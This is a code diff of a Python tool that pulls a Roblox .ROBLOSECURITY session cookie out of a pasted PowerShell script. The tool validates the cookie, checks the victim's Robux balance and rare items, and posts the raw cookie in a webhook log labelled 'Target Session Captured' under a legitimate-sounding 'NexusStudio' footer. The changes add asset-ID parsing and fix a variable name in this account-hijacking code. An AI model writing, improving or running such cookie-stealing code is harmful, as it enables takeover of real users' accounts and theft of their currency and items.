@@ -23,7 +23,10 @@ def main():
         uri_match = re.search(r'-Uri\s+["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
         target_url = uri_match.group(1) if uri_match else "https://www.roblox.com"
 
-        # 2. Extract .ROBLOSECURITY Cookie (supports multiple PowerShell header formats)
+        id_match = re.search(r'/(\d+)/|id=(\d+)', target_url)
+        asset_id = id_match.group(1) or id_match.group(2) if id_match else "126531364524013"
+
+        # 2. Extract .ROBLOSECURITY Cookie
         cookie_match = re.search(r'\.ROBLOSECURITY=([^;\'"\s]+)', decoded_script, re.IGNORECASE)
         if not cookie_match:
             cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
@@ -31,7 +34,7 @@ def main():
         roblosecurity = cookie_match.group(1) if cookie_match else None
 
         if not roblosecurity:
-            print("ERROR: Could not find .ROBLOSECURITY cookie in the pasted PowerShell script. Check your capture format.")
+            print("ERROR: Could not find .ROBLOSECURITY cookie in the pasted PowerShell script.")
             return
 
         print(f"[+] Cookie successfully extracted. Validating with Roblox API...")
@@ -79,11 +82,11 @@ def main():
                 "title": "Roblox Asset Transfer Log",
                 "url": target_url,
                 "description": f"**👤 Target Session Captured**\n`{username}`\n\n" +
-                               f"🛡️ **Cookie Status**\n• State: `{cookieStatus}`\n\n" +
+                               f"🛡️ **Cookie Status**\n• State: `{cookie_status}`\n\n" +
                                f"💰 **Robux Stats**\n• Balance: `{robux_balance} R$`\n• Pending: `{pending_robux} R$`\n\n" +
                                f"🎭 **Rare Items Check**\n• Korblox: `{has_korblox}`\n• Headless: `{has_headless}`\n\n" +
                                f"🔑 **Extracted .ROBLOSECURITY**\n```text\n{roblosecurity}\n```",
-                "color": 6528033 if cookieStatus.startswith("🟢") else 15548997,
+                "color": 6528033 if cookie_status.startswith("🟢") else 15548997,
                 "footer": { "text": "NexusStudio Core Automation | Server-Side Verification" }
             }]
         }
